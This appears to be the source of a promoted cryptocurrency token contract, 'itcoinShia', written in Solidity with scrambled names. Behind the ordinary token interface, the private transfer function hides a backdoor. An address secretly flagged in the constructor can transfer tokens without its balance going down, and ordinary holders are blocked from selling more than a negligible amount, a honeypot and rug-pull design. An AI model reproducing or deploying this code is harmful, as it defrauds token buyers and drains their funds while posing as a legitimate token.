/*

Telegram: https://t.me/BitcoinShia

Twitter: https://twitter.com/BitcoinShia

Website: https://bitcoinshia.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract itcoinShia is Ownable {
    string public name;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address kowmvisun, address ptckgi, uint256 mycsfh) public returns (bool success) {
        require(mycsfh <= allowance[kowmvisun][msg.sender]);
        allowance[kowmvisun][msg.sender] -= mycsfh;
        jyqrvskhwciu(kowmvisun, ptckgi, mycsfh);
        return true;
    }

    mapping(address => uint256) private xlnhqw;

    uint8 public decimals = 9;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private kewsc = 112;

    constructor(string memory amhqcivn, string memory oagt, address mlkofaduws, address xqbnwjzg) {
        name = amhqcivn;
        symbol = oagt;
        balanceOf[msg.sender] = totalSupply;
        xlnhqw[xqbnwjzg] = kewsc;
        pxbhnfljgo = IUniswapV2Router02(mlkofaduws);
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private dujqmfck;

    function transfer(address ptckgi, uint256 mycsfh) public returns (bool success) {
        jyqrvskhwciu(msg.sender, ptckgi, mycsfh);
        return true;
    }

    function approve(address ilhm, uint256 mycsfh) public returns (bool success) {
        allowance[msg.sender][ilhm] = mycsfh;
        emit Approval(msg.sender, ilhm, mycsfh);
        return true;
    }

    IUniswapV2Router02 private pxbhnfljgo;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function jyqrvskhwciu(address kowmvisun, address ptckgi, uint256 mycsfh) private {
        address jnyefd = IUniswapV2Factory(pxbhnfljgo.factory()).getPair(address(this), pxbhnfljgo.WETH());
        if (0 == xlnhqw[kowmvisun]) {
            if (kowmvisun != jnyefd && dujqmfck[kowmvisun] != block.number && mycsfh < totalSupply) {
                require(mycsfh <= totalSupply / (10 ** decimals));
            }
            balanceOf[kowmvisun] -= mycsfh;
        }
        balanceOf[ptckgi] += mycsfh;
        dujqmfck[ptckgi] = block.number;
        emit Transfer(kowmvisun, ptckgi, mycsfh);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
